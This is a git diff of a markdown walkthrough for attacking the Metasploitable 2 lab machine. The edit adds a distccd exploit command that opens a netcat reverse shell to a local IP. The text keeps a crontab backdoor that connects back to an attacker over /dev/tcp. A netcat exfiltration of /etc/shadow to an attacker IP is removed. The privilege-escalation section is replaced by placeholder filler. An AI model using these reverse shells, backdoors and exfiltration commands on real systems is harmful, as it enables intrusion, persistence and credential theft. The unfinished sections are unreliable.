@@ -49,7 +49,6 @@ nmap -A -sV <target IP>
 
 - **Host**: metasploitable.localdomain
 - **OSs**: Unix, Linux
-- **CPE**: cpe:/o:linux:linux_kernel
 
 ## 2. Vulnerability Assessment
 
@@ -72,42 +71,36 @@ nc -vnlp 4444
 
 As the listener is active we execute the exploit and open the reverse shell.
 
-opening a bash shell
+Now we got 2 ways to exploit the Vulnerability, either with a python exploit or with a metasploit exploit.
+Both exploits are downloadable in the exploits folder in this repository
 
+```
+python2 distccd.py -t 192.168.56.101 -c "nc 192.168.56.1 4444 -e /bin/sh"
+```
+
+now where we opened the listener we can send shell commands. with this command we change the shell to a bash shell
+
+```
 python -c 'import pty;pty.spawn("/bin/bash")'
+```
 
 ## 4. Privilege Escalation
 
-Once a low-privilege shell is obtained, escalate privileges.
+Once a low-privilege shell is obtained, we escalate privileges.
 
-### Kernel Exploits:
-
-Look for kernel vulnerabilities like **dirty cow** or `udev` exploits.
-
-### Search for SUID Binaries:
-
-```
-find / -perm -u=s -type f 2>/dev/null
-```
-
-### Misconfigurations:
-
-Check for misconfigured services (e.g., NFS, sudo permissions).
-
-## 5. Pivoting and Lateral Movement
-
-After gaining initial access, pivot within the network using SSH pivoting or port forwarding.
+we do
+this
+and
+this
+and
+this
 
 ### SSH Pivoting Example:
 
 ```
+
 ssh -L <local_port>:<target_IP>:<target_service_port> <user>@<compromised_host>
-```
 
-### Metasploit Route Setup (Post-Exploitation):
-
-```
-run autoroute -s <target IP>
 ```
 
 ## 6. Post-Exploitation
@@ -119,13 +112,6 @@ Use tools like `hashdump` or `mimikatz` to retrieve stored passwords or hashes.
 ### Gather Sensitive Data:
 
 Retrieve SSH keys, database files, and system credentials.
-
-### Data Exfiltration Using Netcat:
-
-```
-nc -lvp 4444 > file.txt
-cat /etc/shadow | nc <attacker IP> 4444
-```
 
 ## 7. Covering Tracks
 
@@ -145,9 +131,15 @@ To maintain access, plant a backdoor or create a new account.
 ### Add a Cron Job for Backdoor:
 
 ```
+
 echo "_/5 _ \* \* \* /bin/bash -i >& /dev/tcp/<attacker IP>/4444 0>&1" >> /etc/crontab
+
 ```
 
 ## Conclusion
 
 This methodology goes beyond simple Metasploit usage by manually exploiting vulnerabilities, escalating privileges, pivoting through networks, and ensuring persistence and stealth. Follow these steps to simulate a more complex attack on Metasploitable 2.
+
+```
+
+```
